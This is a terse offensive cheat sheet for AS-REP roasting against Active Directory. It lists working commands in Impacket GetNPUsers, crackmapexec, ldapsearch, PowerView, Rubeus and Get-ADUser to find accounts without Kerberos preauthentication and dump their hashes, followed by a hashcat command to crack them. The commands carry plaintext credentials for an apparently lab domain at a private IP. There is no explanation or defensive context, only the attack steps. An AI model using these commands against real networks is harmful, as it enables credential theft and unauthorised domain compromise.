# Enumeration
```
# Linux
GetNPUsers.py warzone.oxsium.local/ -usersfile users.txt -format hashcat -dc-ip 192.168.0.239
GetNPUsers.py warzone.oxsium.local/jkimmich:User.domain0001! -request -format hashcat -dc-ip 192.168.0.239

crackmapexec smb 192.168.0.239 -u 'asrep' -p 'Asrep2025!' --asreproast output.txt

ldapsearch -h 192.168.0.239 -x -D "asrep@warzone.oxsium.local" -w "Asrep2025!" -b "dc=warzone,dc=oxsium,dc=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" | grep -i "sAMAccountName"

# Windows
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Properties samaccountname

.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

Get-ADUser -Filter 'userAccountControl -band 4194304' -Properties userAccountControl | Select-Object Name, SamAccountName
```

# Hash Cracking
```
hashcat -m 18200 asrep_hashes.txt final.list --force
```
